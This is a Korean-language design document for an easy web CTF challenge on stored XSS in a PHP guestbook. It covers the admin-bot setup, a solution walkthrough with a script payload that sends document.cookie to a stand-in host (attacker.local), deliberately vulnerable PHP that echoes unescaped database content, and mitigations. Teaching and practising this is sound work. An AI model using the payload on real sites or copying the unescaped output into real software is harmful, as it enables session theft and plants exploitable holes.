---
title: Stored Cross-Site Scripting (Stored XSS) — Web CTF Scenario
created: 2026-06-15
updated: 2026-06-15
type: ctf-scenario
tags: [ctf, web, xss, stored-xss, client-side, easy]
confidence: high
---

# Stored Cross-Site Scripting (Stored XSS) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Guestbook Portal (간이 방명록 서비스)
- **난이도**: Easy (초급)
- **핵심 컨셉**: 입력받은 악성 데이터가 서버 데이터베이스에 영구 저장된 뒤, 해당 리소스를 열람하는 불특정 다수의 브라우저로 전파 실행되는 **저장형 크로스 사이트 스크립팅 (Stored XSS)** 취약점 문제입니다.
- 대상 웹 서비스는 로그인 없이 자유롭게 글을 남길 수 있는 공개 방명록 게시판을 서비스하고 있습니다. 사용자가 작성한 글 본문 내용은 백엔드 서버의 데이터베이스에 삽입되고, 전체 방명록 조회 페이지에서 저장된 목록들이 일괄 출력됩니다. 개발자는 데이터베이스의 텍스트 데이터를 웹 페이지로 다시 출력해 전시할 때, HTML 엔티티 인코딩 처리를 전면 생략했습니다. 공격자는 방명록 쓰기 기능에 악성 자바스크립트를 작성하여 DB에 박아 넣은 뒤, 이 게시판을 주기적으로 강제 확인하고 정찰하는 관리자 봇의 세션을 가로채 플래그를 취득할 수 있습니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Guestbook View & Write Page (`/guestbook.php`)**:
  - 방명록 목록을 출력하고, 신규 글 작성을 접수하는 통합 인터페이스.
  - 데이터 저장 시 POST 방식으로 `content`를 수신하여 DB `guestbook` 테이블에 기록함.
- **Admin Bot (Monitor)**:
  - 새로운 방명록 글이 달렸는지 주기적으로 모니터링하기 위해 본인의 세션 쿠키(`Cookie: flag=[FLAG]`)를 소유한 상태에서 `/guestbook.php` 페이지를 순회 조회하는 최고 관리자 봇.
- **Flag 위치**:
  - 관리자 봇의 세션 쿠키 값.

### 2.2 취약점 지점
1. **Persistent Execution of Unsanitized Database Content**:
  - 데이터베이스에 저장된 레코드를 꺼내와 클라이언트 브라우저 DOM 트리로 렌더링할 때 원시 문자열을 가공 없이 주입합니다:
    `echo "<div class='comment'>" . $row['content'] . "</div>";`
  - 공격자가 1회 저장한 자바스크립트 스크립트 페이로드는 DB가 영구 보존하므로, 이후 해당 페이지를 방문하는 모든 무고한 유저들의 브라우저 백그라운드에서 동일한 공격 페이로드가 계속해서 기동하는 지속성(Persistent) 침해를 낳습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 타입 | 취약 함수 및 태그 |
|------------|--------|------|----------|-------------|-------------------|
| `/guestbook.php` | POST | 불필요 | `content` | Text / HTML | `echo` / `innerHTML` 등의 DB 데이터 출력 바인딩부 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 입력 필드 태그 반영 확인
1. 방명록 작성창의 내용 입력란에 굵은 글씨 효과 마크업 태그를 넣어서 등록을 실행합니다.
   - 입력값: `<b>test text</b>`
2. 제출 후 목록 화면에 'test text'가 굵게 볼드 렌더링되는 형상을 포착하고, 브라우저가 이 텍스트 데이터를 HTML 코드로 정상 번역하여 가동함을 감지합니다.

### Step 2. Stored XSS 페이로드 주입
1. 방문자의 세션 쿠키 탈취를 목적으로 하는 인라인 스크립트를 작성하여 방명록에 등록합니다.
   - 페이로드:
     ```html
     <script>fetch('http://attacker.local/log?c=' + document.cookie)</script>
     ```
2. 등록 완료 후 방명록 화면이 로드될 때 아무 반응도 보이지 않는 상태를 유지하여 스크립트가 화면 뒤에서 실행되었음을 추정합니다.

### Step 3. 피해자(관리자 봇) 조회 대기
1. 공격자는 자신의 사설 수집기 웹 로그 모니터(`attacker.local/log`)를 켜고 접속을 관찰합니다.
2. 주기적으로 방명록 전체 화면을 검열 방문하는 관리자 봇의 백그라운드 루틴이 기동하여 `/guestbook.php` 페이지에 접근하도록 유도합니다. (Stored 방식이므로 링크를 직접 건네줄 필요 없이 봇이 스스로 해당 게시판을 열면 작동함)

### Step 4. flag 획득
1. 봇이 `/guestbook.php`를 로드하는 순간, DB에서 읽혀 화면에 포함된 공격자의 `<script>` 태그가 가동됩니다.
2. 봇 브라우저 컨텍스트의 `document.cookie` 내에 상주하던 중요 플래그가 공격자 로그 서버로 날아옵니다.
3. 공격자 로그에 도달한 수집 파라미터 정보(`FLAG{stored_xss_database_persistent_cookie_theft}`)를 식별하고 최종 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
<!-- guestbook.php (취약한 저장형 XSS PHP 예시) -->
<?php
$conn = new mysqli("localhost", "dbuser", "dbpass", "ctf_db");

// 1. 방명록 저장 로직
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
    $content = $_POST['content']; // 필터링 부재

    // 사용자의 입력 내용을 그대로 DB 테이블에 삽입
    $stmt = $conn->prepare("INSERT INTO guestbook (content) VALUES (?)");
    $stmt->bind_param("s", $content);
    $stmt->execute();
}
?>

<!DOCTYPE html>
<html>
<head><title>Guestbook Portal</title></head>
<body>
    <h1>방명록 작성</h1>
    <form method="POST" action="guestbook.php">
        <textarea name="content" rows="4" cols="50" placeholder="의견을 남겨주세요"></textarea><br>
        <button type="submit">등록</button>
    </form>

    <hr>
    <h2>최신 방명록 목록</h2>
    <div class="list">
        <?php
        $result = $conn->query("SELECT content FROM guestbook ORDER BY id DESC");
        while ($row = $result->fetch_assoc()) {
            echo "<div class='comment'>";
            // 취약점 지점: DB에 저장된 content 레코드 텍스트 값을 화면에 출력할 때, 
            // htmlspecialchars()와 같은 HTML 이스케이프 함수를 적용하지 않아 
            // 데이터 내에 포함된 스크립트 마크업이 실제 실행 가능한 스크립트로 동작함.
            echo "<p>방명록 글: " . $row['content'] . "</p>";
            echo "</div>";
        }
        ?>
    </div>
</body>
</html>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **저장 데이터 출력 시 HTML 엔티티 인코딩 필수 실행**:
   - 데이터베이스에서 데이터를 조회하여 웹 화면의 HTML 본문 요소 내에 삽입할 때는 절대로 원시 데이터 포맷을 허용해서는 안 됩니다.
   - `htmlspecialchars()` 함수를 공통 모듈화하여, 마크업 구조 문자인 `<`, `>`, `&`, `"`, `'`를 텍스트 대체어로 치환해 출력하도록 방어 코드를 구현합니다.
     ```php
     // 안전한 저장 데이터 출력 기법
     echo "<p>방명록 글: " . htmlspecialchars($row['content'], ENT_QUOTES, 'UTF-8') . "</p>";
     ```
2. **콘텐츠 보안 정책 (CSP) 헤더 적용**:
   - 웹 서버의 HTTP Response Header에 `Content-Security-Policy` 규칙을 엄격하게 수립하여 허용된 출처 외의 외부 주소로 스크립트 데이터를 전송하는 행위(`connect-src` 제한)와 인라인 실행(`unsafe-inline` 차단)을 브라우저 통제 기능으로 가로막습니다.
3. **HttpOnly를 활용한 쿠키 자산 격리**:
   - 인증용 세션 값 발급 시 `HttpOnly` 속성을 기본 할당하여, 설령 Stored XSS로 인해 예기치 못한 스크립트 실행 사고가 게시판 전반에서 유발되더라도 자바스크립트의 쿠키 노출 경로를 물리적 차단하여 2차 탈취 피해를 완벽 방지합니다.
